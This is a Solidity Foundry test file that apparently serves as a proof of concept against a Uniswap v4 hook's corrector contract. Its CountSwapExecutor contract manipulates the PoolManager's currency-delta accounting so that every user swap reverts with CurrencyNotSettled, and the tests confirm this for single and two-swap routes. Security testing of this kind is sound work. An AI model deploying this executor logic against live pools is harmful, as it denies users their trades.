// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";

import {ExtensionCampaignBase} from "frontier-test/ExtensionCampaignBase.sol";
import {MockBCToken} from "frontier-test/ProtocolMocks.sol";
import {IFactoryHook} from "frontier/interfaces/IFactoryHook.sol";

import {HookPayload} from "kit/HookPayload.sol";

import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";
import {IWthCorrector} from "contracts/wth-corrector/IWthCorrector.sol";
import {WthCorrector} from "contracts/wth-corrector/WthCorrector.sol";

contract CountSwapExecutor is IWthArbitrageExecutor {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;
    address public immutable corrector;
    address public victim;
    uint256 public pay;

    constructor(IPoolManager _pm, address _corrector) {
        pm = _pm;
        corrector = _corrector;
    }

    receive() external payable {}

    function arm(address _victim, uint256 _pay) external {
        victim = _victim;
        pay = _pay;
    }

    function executeArbitrage(PoolKey calldata key, address, ProfitSplit calldata) external returns (uint256) {
        int256 owed = pm.currencyDelta(victim, key.currency0); // router owes ETH: nonzero, counted
        require(owed < 0, "victim owes nothing");
        uint256 debt = uint256(-owed);
        // borrow from the PoolManager: own delta goes nonzero (count + 1)
        pm.take(key.currency0, address(this), debt + pay);
        // clear the router's debt: its delta goes to zero (count - 1)
        pm.settleFor{value: debt}(victim);
        // pay the corrector so the correction proceeds
        (bool ok,) = corrector.call{value: pay}("");
        require(ok, "pay");
        return 0;
    }
}

contract TwoSwapRouter is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;

    constructor(IPoolManager _pm) {
        pm = _pm;
    }

    receive() external payable {}

    function twoBuys(PoolKey memory key, uint256 a, uint256 b) external payable {
        pm.unlock(abi.encode(key, a, b));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        (PoolKey memory key, uint256 a, uint256 b) = abi.decode(data, (PoolKey, uint256, uint256));
        SwapParams memory p =
            SwapParams({zeroForOne: true, amountSpecified: -int256(a), sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1});
        pm.swap(key, p, "");
        p.amountSpecified = -int256(b);
        pm.swap(key, p, "");
        // settle like V4Router: pay the debt it reads, take the credit it reads
        int256 d0 = pm.currencyDelta(address(this), key.currency0);
        if (d0 < 0) pm.settle{value: uint256(-d0)}();
        int256 d1 = pm.currencyDelta(address(this), key.currency1);
        if (d1 > 0) pm.take(key.currency1, tx.origin, uint256(d1));
        return "";
    }
}

contract DigestBypassTest is ExtensionCampaignBase {
    using HookPayload for IFactoryHook.HookConfigV2;

    uint16 internal constant LP_BPS = 3000;
    uint256 internal constant MIN_PAYMENT = 1e12;

    WthCorrector internal corrector;
    CountSwapExecutor internal executor;
    MockBCToken internal wCoin;
    PoolId internal pid;
    PoolKey internal key;

    function setUp() public override {
        super.setUp();
        corrector = new WthCorrector(address(factory), poolManager, address(weth), 250_000, MIN_PAYMENT);
        (wCoin, pid) = _deployGraduated(
            HookPayload.withFee(3000).addCalculator(address(corrector), abi.encode(TICK_SPACING, LP_BPS))
                .addObserver(address(corrector), HookPayload.CALL_AFTER_SWAP, abi.encode(TICK_SPACING, LP_BPS)),
            false
        );
        key = _poolKey(address(wCoin));
        executor = new CountSwapExecutor(poolManager, address(corrector));
        vm.prank(users.owner);
        corrector.setExecutor(address(executor));
    }

    function test_userSwapCompletes_withIdleExecutor() public {
        executor.arm(address(0xdead), MIN_PAYMENT); // victim owes nothing -> executor reverts -> swallowed
        assertGt(_swapEthForCoin(address(wCoin), users.buyerTwo, 0.3 ether), 0);
    }

    function test_hostileExecutor_revertsEveryUserSwap() public {
        executor.arm(address(swapRouter), MIN_PAYMENT);
        PoolKey memory k = key;
        vm.deal(users.buyerTwo, 1 ether);
        vm.prank(users.buyerTwo);
        vm.expectRevert(); // CurrencyNotSettled at the end of the unlock
        swapRouter.swap{value: 0.3 ether}(
            k,
            SwapParams({zeroForOne: true, amountSpecified: -0.3 ether, sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function test_trace() public {
        executor.arm(address(swapRouter), MIN_PAYMENT);
        PoolKey memory k = key;
        vm.deal(users.buyerTwo, 1 ether);
        vm.prank(users.buyerTwo);
        try swapRouter.swap{value: 0.3 ether}(
            k,
            SwapParams({zeroForOne: true, amountSpecified: -0.3 ether, sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        ) {
            revert("swap completed");
        } catch (bytes memory err) {
            emit log_bytes(err);
            assertEq(bytes4(err), IPoolManager.CurrencyNotSettled.selector);
        }
    }

    function test_twoSwapRoute_completesWithIdleExecutor() public {
        TwoSwapRouter r = new TwoSwapRouter(poolManager);
        executor.arm(address(0xdead), MIN_PAYMENT);
        vm.deal(users.buyerTwo, 1 ether);
        vm.prank(users.buyerTwo, users.buyerTwo);
        r.twoBuys{value: 0.4 ether}(key, 0.2 ether, 0.2 ether);
        assertGt(wCoin.balanceOf(users.buyerTwo), 0);
    }

    function test_twoSwapRoute_revertsWithHostileExecutor() public {
        TwoSwapRouter r = new TwoSwapRouter(poolManager);
        executor.arm(address(r), MIN_PAYMENT);
        vm.deal(users.buyerTwo, 1 ether);
        vm.prank(users.buyerTwo, users.buyerTwo);
        try r.twoBuys{value: 0.4 ether}(key, 0.2 ether, 0.2 ether) {
            revert("route completed");
        } catch (bytes memory err) {
            emit log_bytes(err);
            assertEq(bytes4(err), IPoolManager.CurrencyNotSettled.selector, "unlock fails on the executor debt");
        }
    }
}
